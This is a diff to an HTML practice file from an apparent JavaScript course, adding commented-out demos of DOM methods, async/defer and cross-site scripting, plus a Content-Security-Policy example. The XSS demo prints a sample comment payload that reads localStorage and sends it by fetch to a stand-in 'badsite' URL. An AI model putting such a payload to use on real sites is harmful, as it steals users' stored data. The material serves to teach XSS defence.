@@ -8,12 +8,19 @@
     <link rel="stylesheet" href="css/all.min.css">
     <link rel="stylesheet" href="css/main.css">
     <link rel="icon" href="data:;base64,="> <!--to solve favicon ERROR-->
-    <title>JS</title>
+    <!-- to protect your website from XSS risks -->
+    <!-- <meta
+        http-equiv="Content-Security-Policy"
+        content="default-src 'self' ;
+        script-src 'sha256-zDSuWEvMbUxpisGOj30WQX1RQac766zuqm2VKdc6sGA=';"
+    />  -->
+
     <!-- <script src="main.js"></script> -->
     <!-- it's better to write script at the end of body because in programming it works line by line
         and the script will not work if it before selected tags 
         but if you want to write script in head tag you should use window.onload to load the whole page first 
         then script will make its effect -->
+    <title>JS</title>
 </head>
 <body>
     <!-- <div id="hello">Hello</div> -->
@@ -1167,7 +1174,94 @@
     <footer>
         <p>The Footer. &copy; 2019 Turkey Stuff Inc.</p>
     </footer> -->
+    <!-- <h1>DOM Element matches(), closest(), &amp; querySelector()</h1>
+    <main class="content">
+        <p id="first" class="para">
+        FIRST Lorem ipsum dolor sit, <span>this is the span</span> amet
+        consectetur adipisicing elit. Iure aliquid quisquam optio harum dicta
+        quae! Similique molestiae modi nostrum omnis animi sit, dicta voluptatem
+        earum vel minus ab corporis perspiciatis!
+        </p>
+        <p id="second" class="para">
+        SECOND Lorem ipsum dolor sit, <span>this is the span</span> amet
+        consectetur adipisicing elit. Ut, explicabo illum nam deleniti minus,
+        rem error quibusdam eaque asperiores ab magnam fugiat in magni sint
+        quaerat similique temporibus iste cum.
+        </p>
+        <p class="output"></p>
+    </main> -->
+    <!-- <header>
+        <h1>Async and Defer</h1>
+    </header>
+    <main>
+    <p>
+        Lorem ipsum dolor sit, amet consectetur adipisicing elit. Eveniet optio
+        et impedit rem soluta deserunt magnam dolor at, ducimus animi obcaecati
+        eligendi, recusandae, sunt eaque laboriosam beatae nulla. Harum, velit.
+    </p>
+    <script src="async-defer.js"  ></script>
+    <p>
+        Sunt debitis consectetur temporibus ipsum incidunt, ducimus soluta
+        dolore eius sed provident omnis deserunt officiis necessitatibus sit
+        numquam fuga quo laboriosam? Quae voluptates temporibus consequuntur
+        esse corrupti in ratione sapiente.
+    </p>
+    <p>
+        Omnis, error! Tempora optio exercitationem sunt ratione possimus fugit
+        delectus libero, aliquam quidem accusantium officia voluptatibus tenetur
+        nihil unde numquam vero. Veniam, necessitatibus doloremque aperiam
+        nesciunt esse similique debitis! Dicta!
+    </p>
+    <p>
+        Necessitatibus soluta beatae autem recusandae nisi eveniet minima eum
+        sunt? Ratione distinctio consequuntur eligendi eveniet architecto magni
+        nihil, odio quod dignissimos, neque harum ex dicta pariatur aliquam
+        mollitia iusto et.
+    </p>
+    <p>
+        Voluptate asperiores tenetur vitae adipisci architecto est at modi,
+        eveniet iusto quod dignissimos, saepe corrupti iste velit! Delectus
+        asperiores sapiente a, quas amet pariatur adipisci unde, blanditiis
+        tempore dicta quo.
+    </p>
+    <p>
+        Voluptatibus reiciendis numquam veritatis facilis consectetur amet
+        doloribus vel explicabo dolore! Eius dolor doloremque quas voluptates ea
+        dolores tenetur magni illum, repudiandae molestiae voluptas earum dolore
+        fugit consequatur aperiam iste?
+    </p>
+    </main> -->
+    <!-- <h1>XSS Cross-Site Scripting</h1>
+    <main id="main">
+        <form id="myform">
+            <p>
+                <label for="comments">Comments</label>
+                <textarea id="comments"></textarea>
+            </p>
+            <p>
+                <button id="btn">Add</button>
+            </p>
+        </form>
+    </main>
+    <section id="output"></section>
+    <h3>Sample of What is being pasted into the comment field</h3>
+    <code><pre>
+        &lt;span onmouseover="javascript:console.log('something bad just happened');<br/>
+        this.style.backgroundColor='lavender';<br/>
+        let ls=localStorage.length;<br/>
+        let s='';<br/>
+        for(let i=0;i&lt;ls;i++){<br/>
+            let k=localStorage.key(i);<br/>
+            s.concat(JSON.stringify(localStorage.getItem(k)));<br/>
+        };<br/>
+        let c = window.localStorage;
+        s.concat('&amp;', c);
+        let u='http://localhost/badsite/savedata.php?data='+encodeURIComponent(s);<br/>
+        fetch(u).catch((err)=>console.log(err));"&gt;
+        Some text that the user won't see&lt;/span&gt;<br/>
+    </pre></code> -->
     <script src="main.js" type="text/javascript"></script>  
+    <!-- <script src="main.js" type="text/javascript" integrity="sha256-zDSuWEvMbUxpisGOj30WQX1RQac766zuqm2VKdc6sGA="></script>   -->
     <!-- <script src="main.js" async></script> you can write script tag at the beginning of html file but you have to add async attribute -->
     <!-- <script src="main.js" type="module"></script>
     <script src="/Module/Module.js" type="module"></script>
